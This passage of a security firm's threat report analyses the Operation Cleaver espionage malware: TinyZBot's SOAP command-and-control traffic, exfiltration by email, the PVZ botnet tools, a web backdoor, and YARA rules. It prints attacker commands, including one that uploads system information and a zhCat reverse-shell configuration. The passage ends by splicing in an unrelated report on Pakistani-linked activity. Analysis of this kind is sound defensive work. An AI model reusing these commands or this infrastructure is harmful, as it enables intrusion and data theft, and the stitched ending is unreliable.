 be used to exfiltrate information visually, as well as to remotely control the computers hosting the
 RDP servers.The sending is
performed by internally developed malware samples such as TinyZBot and Csext in order to
exfiltrate information about the infected computer, as well as requested files and keystroke
logging information.Messages were sent using an open SMTP relay at BeyondSys.com with
the sender email address dyanachear(at)beyondsys.com.This allowed the attackers to use
infrastructure that was not theirs to exfiltrate information.The known recipient addresses of this
information were testmail_00001(at)yahoo.com and TerafficAnalyzer(at)yahoo.com.In order to deceive anyone reading these emails, they made them appear to be a spam
message that most would not think twice about.The subject used is the following:

       No Prescription required.Viagra Dosages: 25, 100, 150mg.Fast worldwide delivery.The message used is the following:

       Buy Viagra150mg x 50 tablets for only $124.99!No Prescription required.Viagra dosages: 150, 100, 25mg.Fast
       Worldwide Delivery.See the attachment movie.Free bonus trip.bestviagra4u.cn

The files being exfiltrated are added to the email as attachments.SOAP
SOAP is a sub-protocol communicated via HTTP.In relation to Operation Cleaver, it is used as the
command and control protocol for TinyZBot, which was the preferred backdoor, and underwent
long-term development.HTTP communications are often used by botnets, but it is uncommon
to use a sub-protocol such as SOAP.It is likely that SOAP was used because it is simple to
implement in C#, and has the added benefit of blending in with other benign HTTP traffic.As part of TinyZBot’s command and control protocol, files can be exfiltrated over SOAP to the
command and control server.For more information about TinyZBot, see the Persistence section.46
#OPCLEAVER


  PERSISTENCE
  Persistence is the means of maintaining access to a compromised network.There are limitless
  methods of persistence; the following are techniques and tools for persistence used by Cleaver.TinyZBot
  TinyZBot is a backdoor developed in C#.This bot is the longest developed malware we have
  analyzed from this organization.The earliest known version was compiled in January 2013 and
  we continued to see new versions being created actively.The purpose of TinyZBot is to gather
  information from an infected computer as well as maintain and further access into a compromised
  network.f20476 f64
  TinyZBot was developed with the clear intention of targeted campaigns.The name TinyZBot is
                                  6
                                 4
  assumed to be referring to this project as a less versatile version of the ZeuS botnet, although
                                4
                              20
  it does not exhibit the major browser injection features of ZeuS.To be clear, TinyZBot shares
  no code with ZeuS or its variants, and is developed in a different programming language.The
                               c




  majority of the code in TinyZBot was created by Cleaver.c2
                     04576696




  TinyZBot Features
  TinyZBot supports a wide array of features that continually evolved over time.For the evolution of
  features, see the History section.Potential reasons for using SOAP are:

1.SOAP-based communications are simple to implement in C#.2.SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware.As part of SOAP communications, a URI is specified.This is internal to the sub-protocol, and does
not necessarily reflect the URI of the host running the SOAP server (ASMX file).In the case of
TinyZBot, and many examples for developing SOAP applications, this URI is tempuri.org.Since the first version of the SOAP-based command and control protocol was implemented,
TinyZBot used what is referred to as a “dynamic password”.The result of this is a
cryptographically hashed version of the server time (which must be obtained through a SOAP
query), the TinyZBot’s GUID, and the TinyZBot’s AppUsageID (campaign identifier).For the command and control examples below, red text represents TCP data sent from the
TinyZBot infection while blue text represents TCP data sent from the command and control
server.The server time lookup query invokes the SOAP command GetServerTime.org/” /></soap:Body></soap:Envelope>

HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Mon, 06 Oct 2014 13:36:47 GMT
Content-Length: 392




48
#OPCLEAVER


  TinyZBot Command and Control Protocol (cont.)Commands, updates and files to drop and execute are stored as files on the SOAP server, and
  access is restricted by the AppUsageID as well as the bot GUID.This allows for commands to be

                                  6f20476 f64
  sent to all bots for a campaign as well as individual control.The TinyZBot queries the server in
  order to enumerate all files currently available to it.tmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></
GetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>

In order to download the file and parse for commands to execute, the TinyZBot must request the
file.The file is downloaded Base64-encoded inside of the SOAP response.POST /checkupdate.asmx
HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol
2.0.50727.1433)
Content-Type: text/xml; charset=utf-8
SOAPAction: “http://tempuri(dot)org/GetFile”
 Host: microsoftactiveservices(dot)com
Content-Length: 478
Expect: 100-continue

HTTP/1.1 100 Continue

<?xml version=”1.0” encoding=”utf-8”?>
<soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.The command file downloaded in this example is as follows:

  ;20140914__084450
  RUNCMD=cmd.exe,/C ipconfig /all >> “[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt”2>&1
  UPLOAD=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt
  DELETE=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt


  The first line is a timestamp of the command.The TinyZBot command parser ignores it.The
  RUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being
  redirected to a file in a directory designated for files to be uploaded.The UPLOAD command
  requests that this file is then uploaded over SOAP to the command and control server.The
  DELETE command then requests that the file be deleted from the infected system.There are additional SOAP commands, but they will not be
                    2




  covered in detail.The following is a list of all the SOAP commands: CheckFileMD5, GetFile,
                   b




  GetFileList, GetServerTime, UploadFile.e6
                6




  Deception
               9




                                 86
                              546
  TinyZBot is commonly installed using some form of deception.Recent versions use the resume-
  based methods reported in the Initial Compromise sections.An additional method was used for
  earlier versions.When early versions of TinyZBot were executed, they opened an image stored
  in the resource section of the executable and copied the malicious TinyZBot executable to the
  %AppData% directory.Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe.The
  backdoor additionally replaced the original malicious executable with an appropriately named
  image file and padded the image file with null bytes in order to mirror the original file size.This early version
 had very little functionality.It was limited to logging keystroke data, sending emails, and creating
 a link in the user’s startup folder for persistence.Its method of exfiltrating the logged keystrokes
 relied upon a hardcoded email address stored in the binary.The sender email address was
 dyanachear(at)beyondsys.com and emails were destined for testmail_00001(at)
 yahoo.com.The message was intended to look like common Viagra spam from China, but
 would be sent with the keystroke logging data as attachments, as well as system information.The initial version did not provide any means of receiving commands and was obfuscated with
 SmartAssembly.The following iteration compiled on March 12, 2013, only contained minor bug
 fixes.The next version was compiled on April 24, 2013.This version starts to look more like an
 average bot.A command and control protocol was established, using HTTP and SOAP for the
 protocol.The command and control server for this version was located at 173.192.144.68/
 DefaultWS(dot)asmx.This new command and control protocol allowed for the addition of
 quite a few other features.An update mechanism was added, and could be regularly scheduled,
 so unassisted periodic update checks were automatically performed.The SOAP API used a
 dynamic password mechanism, which required the computation of a simple key in order to
 access certain parts of the API.The email data exfiltration method also underwent modification
 to be activated at a scheduled interval.There were also some changes, which looked to be bug
 fixes, such as limiting the number of times sending an email could fail.The next day, April 25, 2013, a new version was compiled which allowed for self-deletion.On May 14, 2013, we noticed a change which assisted in the identification of active targets.The AppUsageId (at this point named AppType) was an identifier used by this organization in
 order to differentiate between targets infected with TinyZBot, meaning they could effectively
 run multiple campaigns using the same command and control server and know which target
 was infected.This also allowed for separate commands to be supplied to different targets
 without the need for per-bot commands.At this time, the AppUsageId was total0, but later
 we observed names, which aligned with active targets.The exfiltration email address was also
 changed to TerafficAnalyzer(at)yahoo.com.On June 17, 2013, there was an addition that allowed for the loading of configuration data from
 the PE’s resources.At this time, it was limited to the exfiltration email address.This version was
 not obfuscated with SmartAssembly




52
#OPCLEAVER


  History (cont.)We do not see a new version of TinyZBot until June 7, 2014.There are quite a few notable
  improvements, but nowhere near enough to indicate consistent development on the project for
  a year.SmartAssembly was reused again.A method was added to detect what security related
  software is installed.Avira antivirus was specifically targeted and disabled, due to its detection of
  the new keystroke logger module added in this version.This keystroke logger source is publicly
  available and referred to as DeadkeyLogger.A new string encryption class is added, but the code was copied and pasted from a Microsoft
  example.The ability to extract Internet Explorer passwords was added.Clipboard monitoring
  code was added, but not invoked.The emailing features were removed, but the classes which

                                       20476 f64
  previously contained them were still present but empty.Many more options were enabled to
                                  6   f
  be loaded from PE resources.The ability to add PE resources was added.Another version was
                                4
                             4
  compiled on June 7, 2014, with no feature difference.0
  On June 17, 2014, we see2the first instance of Binder_1, which is aptly named, as it is a binder.c




  The legitimate application used in this version of Binder_1 was compiled on August 22, 2013,
                             c2




  and is a self-extracting archive of desktop wallpapers, including an image from the game Mirror’s
                     04576696




  Edge.The TinyZBot included was the version compiled on June 7, 2014.The version compiled on June 23, 2014, added functionality which allowed screenshots of the
  desktop to be taken.On August 2, 2014, we see another version without SmartAssembly obfuscation.A bug fix is made
  to the keystroke logging method, and clipboard monitoring is enabled.6b2




  Three items were compiled on August 18, 2014.Two of them are TinyZBot binaries, which contain
                 e




  a minor key logging bug fix.The third is a new Binder_1 instance, which contains one of the
                6




  TinyZBot instances compiled that day.The legitimate application included in this binder is called
               9




  Easy_resume_creator and is a legitimate application named EasyRésuméCreatorPro.This
                                 86
  version targeted a major Saudi Arabian oil company.546
  From August 23 to August 26, 2014, new versions of TinyZBot were compiled with the
  AppUsageIds targeting major oil and gas companies in Qatar and Kuwait, Ministries of Foreign
  Affairs in the Persian Gulf, and a major airline holding company in UAE.These versions of
  TinyZBot moved towards a more modular architecture where each component was in its own
  .NET assembly.This was presumably done to limit antivirus detection of each individual file as
  well as allow for dynamic updating of specific modules.All of these were included in their own
  Binder_1 instance, which also dropped Easy_resume_creator.There also seem to be improved software engineering practices in many locations.FTP upload
 support was added, with hardcoded credentials of ano:1.This FTP upload functionality points
 to the command and control server, and is invoked by a command in the SOAP command and
 control channel.These versions have the capability to install as a service.On August 25, 2014, the version compiled on August 18 was submitted to VirusTotal in a ZIP
 archive located at http://dl.doosan-job(dot)com/cv/Easy_Resume_Creator-
 v2.0.zip.This indicates that TinyZBot is not only being installed while impersonating a résumé
 creation suite, but is also impersonating potential employers when distributed.On September 9, 2014, a ZIP file containing TinyZBot and a configuration targeting a major US
 university with its AppUsageId was created.This was discovered on an anonymous FTP server
 in the same IP range as dl.doosan-job(dot)com along with other malware.From September 11 through September 17, 2014, some TinyZBot components were compiled,
 along with a new dropper.This dropper impersonated a tool to submit a résumé to Teledyne.When executed, the user is prompted to enter personal information, and at the end is given a
 button to submit the résumé to Teledyne, although nothing is actually submitted.While the user
 enters this information, their machine is infected with TinyZBot.The AppUsageIds for these
 versions target a major US-based university as well as an Israeli aerospace company.These
 versions began to include a new method of installing as a service.The service runs with the
 name Network Connectivity Manager.Interesting Notes
 TinyZBot, as well as some other tools (Csext, Net Crawler) initially would not run without a
 command line parameter set.This was likely to avoid detonation-based detection engines.This
 command line parameter was opensesemi which is often stored in the application’s code in
 an obfuscated manner.The binders and droppers for TinyZBot provided this command line
 argument and others when executing.TinyZBot uses a dynamic mutex.This was accomplished by combining a static preset prefix with
 the active process ID.This allowed supplemental tools to keep TinyZBot running by enumerating
 every process and checking if the process ID and mutex prefix existed.If no mutex and process
 pair was located, another TinyZBot instance would be started.54
#OPCLEAVER


  Command and Control Servers
        •   88.150.214.168, United Kingdom, microsoftactiveservices(dot)com
        •   95.211.241.249, Amsterdam, Noord-Holland, Netherlands
        •   88.150.214.166, United Kingdom
        •   173.192.144.68, Seattle, Washington, USA
        •   188.227.180.213, United Kingdom
        •   192.111.145.197, Rochester, New York, USA


  Backdoors
  Multiple backdoors were used by this organization.These are scripts or applications that allowed
  for command or code execution outside of the victim network.Many of their backdoors were web
                                   f20476 f64
  applications, added to web servers, so commands can be executed from a browser or client able
                                  6
                                 4
  to communicate with them.This group includes the results of the Shell Creator mentioned in the
                                4
                              20
  Attribution section, as well as ASPX backdoors used by Nesha.A PHP shell was also observed,
  which also included attribution to Nesha in its hashed password.c
                             c2




  An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from
                     04576696




  a staging server.This backdoor does not require authentication, and its use appears to be
  straightforward.Its functionality breaks down into three fairly standard components: SQL queries,
  executing commands, and uploading files.6b2
                6e
               9




                                 86
                              546



                     Figure 24: The ASPX backdoor named “Zh0uSh3ll”, allowing SQL queries.They
 replace the existing Notepad.exe on the infected machine, and when run they call out to a
 remote server and execute any shell code returned by the remote server.There will be a detailed
 analysis of these backdoors posted to Cylance’s blog in the future.PVZ
 PVZ is a name for a set of executables used together to create a botnet.The name PVZ was
 assigned by us as this is one of the few tools this organization has not named themselves.56
#OPCLEAVER


  PVZ (cont.)The components are as follows:

  •   PVZ-In
  •   PVZ-Out
  •   Syn Flooder
  •   LoggerModule
  •   XYNTService
  •   Jasus

  XYNTService was not developed by the Cleaver team, but instead is a publicly available project
  which executes an executable as a service.PVZ-In                        6f20476 f64
                            4 4
  The purpose of PVZ-In 2
                          0
                        is to communicate with a command and control server.Communication
                               c




  is primarily unidirectional, as little information is provided from the bot to its command and
                             c2




  control server.The known command and control server is located at http://kundenpflege.04576696




  menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses
  HTTP.The commands as well as infected computer information are transferred in the Content-
  Disposition HTTP header, making the traffic easy to pass over as benign.When a command is received from the server, the results are stored in a central location on disk
  that the PVZ tools utilize.Command functionality is limited to executing supplied commands,
  downloading and executing executables as well as self-updating.b2




  The debug file path for PVZ-In is:
                 e6
                6




  C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\
               9




  Release\BotManager.pdb          6
                                 8
                              546
  PVZ-In has been observed using the file name ossisvc.exe.PVZ-Out
  PVZ-Out is the other half of the command and control channel, primarily uploading results of
  commands and keystroke logging data to a remote server.The known command and control server
  for PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx.Much like PVZ-In, this command and control channel communicates with the Content-Disposition
  HTTP header, but for file data, POST data is supplied.The debug file path for PVZ-Out is:

C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\
Release\SendModule.pdb

PVZ-Out has been observed with the file name osppsvc.exe.SYN Flooder
SYN Flooder is a simple network based denial of service tool.It is a command line utility capable of
being invoked by PVZ-In.Targeting information is supplied via command line parameters.The debug file path for SYN Flooder is:

C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket-test\
Release\socket-test.pdb

SYN Flooder has been observed using the name ossysvc.exe.Logger Module
Logger Module observes the user’s actions and records them to a file.The recorded actions include
mouse clicks, active windows, keypresses, as well as clipboard data.The resulting log is written out
to a location where PVZ-Out can exfiltrate it to its command and control server.Logger Module has
been observed using the name ospcsvc.exe.The following command and control servers for Logger Module have been observed:

212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de
212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de


wndTest
WndTest is the evolution of the PVZ tool chain into a single executable.The tool chain is minimized
down to a command and control communications, keystroke logging, and clipboard monitoring.The command and control still supports upgrading, downloading, and executing of applications, as
well as executing batch scripts.WndTest installs as a service and has been observed attempting to
impersonate Adobe Report Service.WndTest starts using PHP servers for its command and control
server, some of which are listed as defaced sites.Its primary functionality
  is based on commands supplied by its configuration file.The configuration file is able to store

                          6f20476 f64
  specific commands, which are intended to run at particular times.A recovered configuration is as
  follows:
                       44
                    20
  domain1=srv01.microsoftwindowsupdate(dot)net,check.html,3
  %%
                                c
                              c2




  {0}\{zhname}$$ -h -x -i {domain1} -p 443 -e c:\windows\system32\cmd.04576696




  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35
  %%
  ##

  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a
  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor
  Relations) with XORed communication using the HTTP protocol on TCP port 443.This zhCat
                     2




  instance is running cmd.exe, effectively making it a reverse connecting shell.This command
                    b




  runs at 00:29 in the morning, and is killed by taskkill at 00:35.This gives the attackers a
                   6




  predictable method to regain access to a compromised network if they ever lose access.6e
                9




  Csext also has email functionality similar to TinyZBot.This email functionality is used to exfiltrate
                                   6
  the results of commands from the command file which can also include requests like gathering
                                  8
  user information.If inside the United States, contact the Federal Bureau of Investigation (FBI) via either your local
  FBI team or FBI CYWATCH at 1-855-292-3937 or cywatch@ic.fbi.gov.2.If outside the United States, contact your local, district, state or federal law enforcement
  authorities.20476 f64
  3.If you have visibility into the attacks on your company and the tools and expertise to track them
                                   6f
  down, leverage the IOCs in Appendix A to identify their presence in your network, prevent them
                                  4
                               4
  from expanding the scope of the compromise, and remove their access immediately.20 into the attacks, need help identifying an existing successful
  4.If you do NOT have visibility
                                c
                              c2




  compromise in your organization, or more importantly wish to prevent this attack or attacks similar
  to Operation Cleaver, please contact your security provider.04576696




  5.If you wish to contact Cylance for additional details not available in this report, please email
  opcleaver@cylance.com.6.If you would like to learn more about Cylance products and professional services, or discuss how
  Cylance can mitigate Operation Cleaver’s impact to your organization, please contact us directly.They have long been an “enemy” of
  the west, and the United States in particular, but today’s headlines include a variety of topics from
  nuclear talks to human rights to terrorism to cyber hacking.Iran continues to be extremely active on
  the global stage – and thereby on the radar of every superpower.10

  Iran’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard
  dollars combined with national pride to help build their cyber army.Few doubt their commitment
  as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage
  their enemies.And it has been commonly postulated that almost all activity since 2010 coming out
  of Iran is associated with retaliation for Stuxnet/Duqu/Flame, which seems natural given the severity

                                     20476 f64
  of the impact.But they don’t need Stuxnet as motivation to want to hack the world.They have long
                                  6 f
  desired power on the political stage, in particular in the fight for nuclear power autonomy.With the deadlines around0
                             44
                            the Iranian nuclear discussions pushed to 2015, the attacks may be tied
                         2 discussing a pact with the nuclear superpowers of United States, Britain,
  to negotiating power when
                               c
                             c2




  France, Germany, Russia and China.04576696




  The inner workings of the Iranian government remain largely a mystery to the western world.However, Iran’s control over its people and the private businesses birthed inside has been well
  reported.They have controlled much of the country’s Internet access to date and have taken
                                 86
  over controlling interests in those companies to carry out their work.Given Operation Cleaver’s
                              546
  frequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran,
  and Iran’s well recorded investment in cyber warfare14 leads us to one simple conclusion: Iran is
  extremely active in the world of hacking.Involvement with North Korean

Operation Cleaver’s intense focus on critical infrastructure companies, especially in South Korea,
hints at information sharing or joint operations with Iran’s partner, North Korea.In September,
2012, Iran signed an extensive agreement for technology cooperation agreement with North
Korea, which allows for collaboration on a variety of efforts including IT and security.6

Cyber Moving to Physical

Operation Cleaver’s carefully selected targets like the oil and gas industry, energy and utility
companies, as well as airlines and airports, indicates Iran’s desire to gain deep access into the
world’s most critical environments.The end goal of this operation is not known at this time.University Recruitment

University student recruitment was hinted at within Operation Cleaver and is consistent with
Iran’s reported history of active warrior recruitment in the educational space.15

Overall, there are many reasons that Iran may be pursuing the targets they did in Operation
Cleaver.While we may never truly know, it is important to consider all the above and more when
trying to understand the why.As security experts in Critical Infrastructure and Key Resources (CIKR), Industrial Control Systems
(ICS), Supervisory Control and Data Acquisition (SCADA) systems, Building Management Systems
(BMS), embedded systems and fixed-function systems, we know how easy they are to hack.We have worked with countless customers and vendors throughout the years to notify them of
vulnerabilities, assist with remediatation efforts, and help mitigate threats to their environments.Unfortunately, many critical infrastructure organizations are unable to secure their complex
envirnoments against modern attacks.They fall victim to the “glue flu”, a malaise of feeling stuck,
not wanting to change the status quo for fear they will find problems that they have no idea how
to prevent.This “security anaphylaxis” spells real disaster.If Operation Cleaver doesn’t get the world to wake up to what is happening in the silent world of
cyber, then perhaps nothing will.Prevention is everything and we should never give up until it’s
achieved.Challenge your trusted advisors.Challenge your security vendors.Demand better technology
and services to detect, respond, but most importantly PREVENT not just contemporary attacks,
but future exotic attacks that have yet to be imagined.That is what truly disruptive and innovative
technology is.Don’t settle for anything less.We hope that by exposing the Operation Cleaver team to the world, current global critical
infrastructure victims can be notified, and prevent future victimization from suffering the
consequences of “status quo” security.Unlike United Flight 811, perhaps we can prevent the next
disaster.DEFENDERS, NEVER GIVE UP!The only way to regain the upper hand against a new generation
 of attackers, is to embrace something entirely new.Something that “thinks” like an attacker.Something that doesn’t rely on a trust model or care about hash lookups.Something with a brain.“The world has combated cyber threats by doing the same
                        thing over and over again ... it’s the definition of insanity!”
                           Jeff Moss - Co-Chair of the DHS Community Resiliency Task Force
                               & Founder of BlackHat and DEFCON security conferences

 Cylance has eschewed the old foundations that existing cybersecurity products are built upon.Instead, we’ve based our approach on mathematics, machine learning, and data science.This
 algorithmic approach has been proven to detect – and stop – exponentially more modern threats.Leveraging algorithmic risk modeling, CylancePROTECT protects endpoints from everyday viruses,
 worms, trojans, and spyware, but unlike other security products, CylancePROTECT offers true
 future-proof protection against the most malicious threats in the world.Advanced Persistent Threats
 (APT), 0-days, and exotic exploitation techniques are easily detected and halted with little-to-no
 impact on the end-user.Existing reactive solutions rely on a constant stream of signature updates for threat detection, which
 is not only costly and inconvenient, but also requires “sacrificial lambs”.Only after a previously
 unseen threat has inflicted damage can the rest of the industry begin to detect it.CylancePROTECT
 doesn’t require constant updates or even a network connection to protect against so-called
 “previously undetectable” threats.By identifying and defusing attacks in near real time, before the
 attack can execute, we can finally do away with the need for a “patient zero”.As Richard Stiennon, Chief Research Analyst at IT-Harvest, put it, “Many vendors are trying to solve
 the endpoint problem, yet Cylance is the only one using the power of math to stop malware and
 with more effectiveness and efficiency than current solutions”.Interested in seeing what CylancePROTECT can do for your organization?Contact us!Cylance is one of the fastest growing cybersecurity technology firms in the US.Cylance’s flagship product
 CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe.Cylance
 was founded by 27-year security industry luminary, Stuart McClure, former Global CTO of McAfee, original founder
 of Foundstone, and lead author of the international best-selling book Hacking Exposed.In building Cylance, Stuart
 brought together the best scientific and executive minds from the likes of Cisco, Sourcefire, Google and McAfee.The
 Cylance board of advisors includes former high-ranking officials from the DHS, the FBI, CIA, and executive titans of
 business.68
#OPCLEAVER


  CYLANCE PRODUCTS
  CylancePROTECT is the only next generation endpoint security product that applies math to
  mute existing and future malware, viruses, worms, trojans, bots, APTs, 0-days, exploits, adware,
  spyware and hacking tools – without needing any updates or even a connection to the Internet.The technology is founded on the principle that to fix the industry, you must start from scratch with
  a way as yet unseen.CylancePROTECT does not rely on signatures of any sort (blacklist or whitelist), behavioral
  analysis using IOCs, sandboxing analysis, heuristics, micro-virtualization, or dynamic detonation –
  to detect and prevent malicious files from executing on a target endpoint.While every other endpoint security product must collect a sample, analyze, and write a signature
                                  f20476 f64
  to detect it, CylancePROTECT can detect malware before it executes by statically analyzing
                                6
                               4
  features found in the binary itself.4
                           0
  Features and Benefits of2CylancePROTECT:
                               c
                             c2




  • Near real time detection of malicious files, even if they’ve never been seen in the wild.04576696




  • Can be used to augment existing endpoint security or be deployed as a complete replacement.• Does not require any signature updates or connection to the cloud.• An easy-to-use web management console with intuitive workflows.• Low-impact endpoint agent.For a demo of CylancePROTECT, contact a Cylance expert today!6b2
                6e
               9




                                 86
                              546




                        Figure 26: Cylance products detect and stop all the malware used in
                        Operation Cleaver, even though the vast majority of the samples are
                      completely missed by the antivirus industry as of this report’s publication.Cylance is providing consulting to companies that may have been targeted by these advanced
 threat actors.Cylance will perform initial triage in order to determine the extent to which your
 company has been affected by this campaign and work towards establishing a containment
 strategy.Cylance has two tailored offerings for clients affected by this campaign.The first one includes
 ICS in our incident response since many companies affected are in the Critical Infrastructure and
 Key Resources (CIKR) vertical.The second offering’s focus is to deploy our proprietary tools and
 methodologies to detect and mitigate the threats posed by Operation Cleaver.Option 1: ICS Incident Response & APT Detection and Mitigation
 Option 2: Detection, Remediation, & Mitigation

 For more information on how the Cylance Professional Services team can assess and respond to
 attacks like the ones obseved in Operation Cleaver, contact sales@cylance.com today.INCIDENT RESPONSE
     COMPROMISE ASSESSMENTS                                                Stop the threat, mitigate risk,
                                                                           and remediate.Uncover previously undiscovered
     breach and damage.PENETRATION TESTING
  Check the integrity of your
  environment and infrastructure.FORENSIC INVESTIGATIONS
                                                                           Dig into who, what, where, and
                    CUSTOM SERVICES                                        when a compromise occurred.Get expert help that addresses YOUR security needs.70
#OPCLEAVER


  ACKNOWLEDGMENTS
  Brian Wallace

  Brian is a Sr. Security Researcher for Cylance who joined shortly after the company was established.He is best known for his avid botnet research (often going by “botnet_hunter”) and for his novel
  malware analysis in the A Study in Bots blog series hosted by Cylance.Brian has been a dedicated
  open-source developer as well as an advocate for public and private anti-botnet operations.Brian actively develops techniques to combat cyber oppositions in positions where resources and
  leverage are in too limited of supply for conventional means.These techniques, cultivated by Stuart
  McClure, are the Art of Deterrence.In a previous investigation, Art of Deterrence techniques were
  successfully used to divert Indonesian hackers motivated by monetary gain away from their highest
  yielding target group.6f20476 f64
                                 4
  Brian’s botnet research covers a wide range of topics, from using graph analysis to estimate
                                4
                              20
  the amount of ransom that has been paid to a ransomware operator, to utilizing IPv4 scanning
  techniques to identify and take down point of sale malware panels.c
                             c2




  Stuart McClure
                     04576696




  Stuart is founder, CEO/President and Chairman of Cylance.Widely recognized for his extensive and
  in-depth knowledge of security products, Stuart McClure is considered one of the industry’s leading
  authorities in information security today.A well-published and acclaimed security visionary with
  currently eleven books in print, McClure is the originating founder of the Hacking Exposed series
  of books, the most successful security book ever written.From his work, he founded Foundstone in
  October of 1999 which sold to McAfee in 2004.2




  McClure brings over two decades of technology and executive leadership with profound technical,
                   b




  operational, and financial experience.Besides Foundstone, Stuart held leadership positions at
                  6




  InfoWorld, Ernst & Young, Kaiser Permanente and a number of government agencies.At McAfee,
                6e




  McClure held numerous positions including SVP/General Manager for the Security Management BU
               9




  as well as EVP/Global Chief Technology Officer responsible for almost $3B worth of revenues.6
  Today, McClure is CEO of Cylance, a disruptive and innovative startup applying math to the problem
                                 8
                              546
  of security.Cylance products such as CylancePROTECT prevent the most advanced attacks in the
  world without signatures or sandboxing in realtime on the endpoint.Cylance Services offer highly
  specialized security services such as incident response, forensics, compromise assessments and
  advanced penetration assessments for global critical infrastructure.Cylance Team
  Cylance employees work passionately and tirelessly every day to achieve one goal: Protect the
  world from cyber attacks.And with their efforts in tracking Operation Cleaver, they have achieved
  that goal.Our endless thanks to all the Cylancers who contributed to this report.Due to the close connection between the
 members tracked in this report and the IRGC, it was only fitting to replicate the look and feel of the
 IRGC’s iconography as the anchor for this document’s branding.represents the group’s likely connection with the
 •	   The globe symbolizes the IRGC’s worldwide                IRGC as well as armed resistence in general.ambitions.•	   The globe in the background represents
 •	   The book, from which the clenched first                  Operation Cleaver’s worldwide reach.emanates, represents the Qur’an, connecting         •	   An ethernet cable connected to the clenched first
      the religious ideals on which the group was              represents the nature of these attacks (cyber as
      founded to the armed struggle.opposed to traditional warfare).•	   The plants, possibly wheat, represent               •	   The hex string translates to “Think Evil, Do Good”,
      prosperity.a mantra our research team lives by.•	   The name of the group in Persian, the year in
      which it was founded and a passage from the
      Qur’an (8:60) ‘And make ready against them all
      you can of power’, are represented in text.CylancePROTECT prevents the malware used in Operation Cleaver from ever executing.rule SmartCopy2
  {
    strings:
      $s1 = “SmartCopy2.Properties”
      $s2 = “ZhuFrameWork”
    condition:
      all of them
  }

  rule SynFlooder
  {
    strings:
      $s1 = “Unable to resolve [ %s ].Beginning in the summer of 2013, TCIRT identified a suspected Pakistani-origin threat group.This group was revealed by TCIRT
publicly in August 2013.In the months following the disclosure, we identified new activity.Cyber Squared partnered with experts
at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its
Operation “Arachnophobia”.The following report is a product of collaborative research and threat intelligence sharing between
Cyber Squared Inc.’s TCIRT and FireEye Labs.Key Findings
•	 While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently
    point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets and/or
    those who are involved in India-Pakistan issues.•	 The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S. for
    command and control (C2).•	 The customized malware (BITTERBUG) used by these threat actors has only been observed hosted on and communicating with
    two IP addresses operated by a Pakistan-based hosting provider.•	 Early variants of the BITTERBUG malware had build paths containing the strings “Tranchulas” and “umairaziz27”.Tranchulas is the name of a Pakistani security firm; Umair Aziz is the name of a Tranchulas employee.•	 Following the release of our blog post highlighting this activity and the malware’s build strings, the threat actors appear to have
    modified their binary file paths to make them more generic.•	 Employees at both the Pakistan-based hosting provider and Tranchulas appear within each others’ social networks.Summary
On August 2, 2013, the TCIRT published the blog “Where There is Smoke, There is Fire: South Asian Cyber Espionage Heats
Up” in which TCIRT identified custom malware, later dubbed BITTERBUG by FireEye, suspected to be linked to Pakistani-based
exploitation activity directed against Indian entities.We found debug path references to “Tranchulas”, which is also the name
of a Pakistani security company.Tranchulas claims to support “national level cyber security programs” and the development of
offensive and defensive cyber capabilities.At the time, the incident seemed to be an isolated one for TCIRT, but it was only the
beginning.Our suspicions of Tranchulas’ involvement in the activity began to mount, based on a series of events that occurred
both before and after the release of our blog post.During the past year, we communicated with Tranchulas and the Pakistan-based hosting provider.Suspicious responses and
oddly similar replies received from both companies to our inquiries, as well as anomalies in their email headers, prompted us to
research the companies further.Our research revealed:

•	 The C2 hosting provider (VPSNOC) has likely been conducting business operations from within Pakistan, subleasing
    infrastructure from U.S. providers.•	 VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media.•	 Both organizations have employed or are affiliated with personnel who have offensive cyber expertise.•	 When TCIRT was initially contacted by Tranchulas following our original blog post, they denied any involvement in the activity.Tranchulas maintained that they were being framed, and that they were already aware of the activity prior to both our blog post
    and our contact.However, inconsistencies in their claims and their responses made such a scenario questionable.1    •    OPERATION ARACHNOPHOBIA
Backstory
TCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013.To our knowledge this customized malware
has only ever been observed hosted on and communicating with two command and control nodes: 199.91.173.431 and
199.91.173.45.2 3 According to Whois records, those IP addresses were registered to a web-hosting firm in Kansas City,
Missouri.Based on public records, this organization appears to be a legal entity chartered to conduct business in Missouri.4

On July 24, 2013, TCIRT contacted the Kansas City-based hosting provider to notify them of the malicious activities emanating
